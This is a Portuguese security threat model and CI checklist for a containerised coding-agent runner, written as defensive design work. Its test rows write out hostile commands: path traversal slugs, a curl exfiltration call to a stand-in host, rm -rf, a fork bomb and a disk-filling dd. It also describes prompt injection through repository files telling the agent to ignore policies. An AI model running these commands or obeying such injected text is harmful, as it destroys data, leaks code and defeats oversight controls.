# Discovery 009 — Security Discovery

> **Status:** Completed (checklist inicial)
> **Bloqueia:** Fase 1
> **Prioridade:** P0
> **Data:** 2026-07-27

## Objetivo

Validar, antes da implementação, as ameaças mais relevantes para o OCAB e produzir uma checklist reutilizável em CI para endurecer o pipeline.

Esta checklist sintetiza ameaças registradas em [`../security/threat-model.md`](../security/threat-model.md), [`../specs/011-security-hardening/spec.md`](../specs/011-security-hardening/spec.md) e nos ADRs 0005, 0006, 0007, 0008, 0013, 0014.

## Ameaças, testes e mitigações

### Ameaça 1 — Path traversal via slug ou argumento

| Campo | Conteúdo |
| --- | --- |
| Hipótese | atacante envia `repository.slug` malicioso ou argumentos com `..`/`/` que escapam do workspace |
| Teste | `run_create` com slug `../etc/passwd`, `slug=a/../../b`, slug válido com `prompt` contendo `../../etc/passwd` |
| Resultado esperado | `400 invalid_slug` ou `422 validation_failed`; prompt registrado literalmente |
| Impacto | vazamento de arquivos do host ou execução fora do workspace |
| Mitigação proposta | validação rigorosa de slug (regex), path canonicalization com `Path.GetFullPath`, validação de prefixo |
| Risco residual | baixo |
| Bloqueia | Fase 3 |
| ADR/SPEC | ADR-0014, WI-FR-005 |

### Ameaça 2 — Symlink escape

| Campo | Conteúdo |
| --- | --- |
| Hipótese | repositório contém symlink para `/etc` ou `/var/run/docker.sock` e o runner resolve |
| Teste | fixture com `ln -s /etc etc-link`; executar leitura via runner |
| Resultado esperado | execução `Rejected` (`symlink_escape_detected`) |
| Impacto | leitura de arquivos arbitrários do container |
| Mitigação proposta | `RealPath` antes de cada operação de FS; rejeitar symlinks que saiam do workspace |
| Risco residual | baixo |
| Bloqueia | Fase 3 |
| ADR/SPEC | WI-FR-006, SH-FR-007 |

### Ameaça 3 — Acesso fora do workspace pelo runner

| Campo | Conteúdo |
| --- | --- |
| Hipótese | o processo é executado em `/workspace` mas comando tenta `cd /` e ler arquivos do container |
| Teste | `cd / && ls` em execução read-only |
| Resultado esperado | comando bloqueado pelo policy engine (`command_not_allowed`) |
| Impacto | enumerar sistema de arquivos do container |
| Mitigação proposta | policy engine com allowlist + validação de `cwd` antes do `Process.Start` |
| Risco residual | médio (depende da completude da allowlist) |
| Bloqueia | Fase 6 |
| ADR/SPEC | ADR-0007, spec 006 |

### Ameaça 4 — Execução como root

| Campo | Conteúdo |
| --- | --- |
| Hipótese | container do runner sobe como `root` por configuração errada |
| Teste | `docker run ... ocab-opencode-runner:latest` sem `user:` |
| Resultado esperado | configuração rejeitada pelo linter do Compose ou pelo policy engine |
| Impacto | privilégio excessivo, escape facilitado |
| Mitigação proposta | `user: "10001:10001"` obrigatório; teste em CI |
| Risco residual | baixo |
| Bloqueia | Fase 1 |
| ADR/SPEC | SH-FR-001, OCR-NFR-001 |

### Ameaça 5 — Presença de Docker socket

| Campo | Conteúdo |
| --- | --- |
| Hipótese | algum service do OCAB monta `/var/run/docker.sock` |
| Teste | scan recursivo do `compose.yaml` por `docker.sock` |
| Resultado esperado | nenhuma ocorrência |
| Impacto | escape para root via socket |
| Mitigação proposta | revisão obrigatória em CI; ADR-0006 fixando como premissa bloqueada |
| Risco residual | baixo |
| Bloqueia | Fase 1 |
| ADR/SPEC | ADR-0006 |

### Ameaça 6 — Acesso a credenciais do host

| Campo | Conteúdo |
| --- | --- |
| Hipótese | o runner monta `~/.ssh`, `~/.aws` ou `~/.gitconfig` |
| Teste | scan do `compose.yaml` por mounts `~/.ssh`, `~/.aws`, `~/.config/gh` |
| Resultado esperado | nenhuma ocorrência |
| Impacto | exfiltração de credenciais via prompt |
| Mitigação proposta | nenhuma montagem de credenciais pessoais; uso de tokens de aplicação |
| Risco residual | baixo |
| Bloqueia | Fase 1 |
| ADR/SPEC | SH-FR-008, OQ-091 |

### Ameaça 7 — Acesso à rede pública sem restrição

| Campo | Conteúdo |
| --- | --- |
| Hipótese | o runner faz `curl https://exemplo.invalid/leak` para exfiltrar código-fonte |
| Teste | `docker exec <runner> wget https://example.com` |
| Resultado esperado | bloqueio por egress policy; se passar, captura em logs |
| Impacto | exfiltração de código-fonte do repositório |
| Mitigação proposta | default deny + allowlist por repositório (OQ-032); TLS inspection opcional |
| Risco residual | médio |
| Bloqueia | Fase 3 |
| ADR/SPEC | ADR-0013, OQ-032 |

### Ameaça 8 — Exfiltração por logs

| Campo | Conteúdo |
| --- | --- |
| Hipótese | prompt contém token acidental; runner loga stdout com conteúdo integral |
| Teste | prompt com placeholder `__SECRET_PLACEHOLDER__`; verificar logs |
| Resultado esperado | redaction aplicada em logs estruturados |
| Impacto | exposição de credenciais |
| Mitigação proposta | middleware de redaction com base em allowlist/denylist de padrões; testes automatizados |
| Risco residual | baixo |
| Bloqueia | Fase 1 |
| ADR/SPEC | SH-FR-009 |

### Ameaça 9 — Comandos destrutivos

| Campo | Conteúdo |
| --- | --- |
| Hipótese | agent emite `rm -rf /workspace/*` ou `git push` |
| Teste | execução com `git push origin main` ou `rm -rf` |
| Resultado esperado | rejeitado pelo policy engine; sem `git push` para remote |
| Impacto | alteração irreversível |
| Mitigação proposta | policy engine com denylist explícita; rede sem acesso ao remote para pushes automáticos |
| Risco residual | baixo |
| Bloqueia | Fase 7 |
| ADR/SPEC | ADR-0008, spec 006 |

### Ameaça 10 — Fork bomb

| Campo | Conteúdo |
| --- | --- |
| Hipótese | comando malicioso faz `while true; do ... done` ou `:` recursive |
| Teste | `bash -c ':(){ :|:& };:'` no runner |
| Resultado esperado | container falha por `pids_limit`; runner reinicia |
| Impacto | denial-of-service do runner |
| Mitigação proposta | `pids_limit=512` (baseline 008); reinício controlado |
| Risco residual | baixo |
| Bloqueia | Fase 1 |
| ADR/SPEC | OQ-031 |

### Ameaça 11 — Disco cheio

| Campo | Conteúdo |
| --- | --- |
| Hipótese | execução grava `dd if=/dev/zero of=big.bin` até encher `/mnt/hd2` |
| Teste | emulação com `MaxOutputBytes` em ProcessSupervisor; quota de volume |
| Resultado esperado | container falha por `MaxOutputBytes` ou volume cheio |
| Impacto | indisponibilidade do host |
| Mitigação proposta | `MaxOutputBytes`, quota por execução, retenção, alerta em 80% |
| Risco residual | baixo |
| Bloqueia | Fase 1 |
| ADR/SPEC | OQ-031, R5 |

### Ameaça 12 — Processos órfãos

| Campo | Conteúdo |
| --- | --- |
| Hipótese | processo inicia subprocesso e morre; subprocesso fica sem PGID |
| Teste | `bash -c 'sleep 300 &'; exit` no runner |
| Resultado esperado | PGID associado; SIGTERM no PGID cleanup; SIGKILL após grace |
| Impacto | vazamento de recursos |
| Mitigação proposta | `ProcessSupervisor` com process group + grace period + cleanup lock por `runId` |
| Risco residual | baixo |
| Bloqueia | Fase 3 |
| ADR/SPEC | OQ-005, spec 006 |

### Ameaça 13 — Manipulação da origem Git

| Campo | Conteúdo |
| --- | --- |
| Hipótese | agent escreve direto na origem (que deveria estar read-only) |
| Teste | tentar `git commit` no volume read-only |
| Resultado esperado | operação falha com permissão negada |
| Impacto | adulteração do repositório original |
| Mitigação proposta | montagem read-only do original; permissões POSIX; `protected branches` no policy engine |
| Risco residual | baixo |
| Bloqueia | Fase 3 |
| ADR/SPEC | ADR-0005, WI-FR-002 |

### Ameaça 14 — Prompt injection em arquivos do repositório

| Campo | Conteúdo |
| --- | --- |
| Hipótese | repositório contém `INSTRUCTIONS.md` ou `CONTRIBUTING.md` com texto instruindo o agente a ignorar policies |
| Teste | prompt que induz leitura de arquivo com injeção |
| Resultado esperado | policy engine valida arquivos que viram parte do contexto |
| Impacto | contornar controles |
| Mitigação proposta | revisão dos arquivos lidos pelo agent; allowlist de paths no `Policy Decision Engine` |
| Risco residual | médio |
| Bloqueia | Fase 7 |
| ADR/SPEC | ADR-0007, R10 |

### Ameaça 15 — Vazamento de token entre containers

| Campo | Conteúdo |
| --- | --- |
| Hipótese | bridge envia token para OpenCode, mas logging de payloads expõe em logs do bridge |
| Teste | E2E com `tcpdump` ou log inspection em teste de integração |
| Resultado esperado | token mascarado em logs |
| Impacto | comprometimento do canal |
| Mitigação proposta | redaction no payload; `Authorization` nunca aparece em logs |
| Risco residual | baixo |
| Bloqueia | Fase 1 |
| ADR/SPEC | OQ-090 |

## Checklist reutilizável em CI

```markdown
# OCAB security checklist (CI gate)

- [ ] Nenhum `docker.sock` em mounts (`grep docker.sock compose.yaml`)
- [ ] Nenhum `privileged: true` em nenhum service
- [ ] Nenhum `network_mode: host`
- [ ] Nenhum service exposto em `0.0.0.0` exceto o explicitamente autorizado
- [ ] `user: "10001:10001"` em todos os services
- [ ] `cap_drop: ALL` em todos os services
- [ ] `no-new-privileges: true` em todos os services
- [ ] `read_only: true` em runners e bridge
- [ ] Sem `host.docker.internal`, `localhost` ou paths absolutos arbitrários no Compose
- [ ] Sem `~/.ssh`, `~/.aws`, `~/.docker`, `~/.gitconfig` em volumes
- [ ] Nenhum `secrets:` em env var; sempre via `secrets:` do Docker
- [ ] `pids_limit`, `cpus`, `memory` definidos para todos os services
- [ ] Logs estruturados passam por redaction
- [ ] Bearer tokens gerados pelo menos 32 bytes (256 bits)
- [ ] Testes de path traversal, symlink escape e prompt injection passam
```

## Riscos residuais e follow-ups

| Risco | Status |
| --- | --- |
| SBOM e scanning de dependências (OQ-033) | pendente |
| Pentests (OQ-034) | pendente |
| Estratégia de egress explícita por runner (OQ-032) | parcialmente resolvida |
| Rotação automática de credenciais (OQ-030) | manual no MVP |

## Próximo passo

* Adicionar este checklist ao pipeline de CI a partir do slice 1.1.1.
* Revisar após a Fase 3 com aprendizados reais.
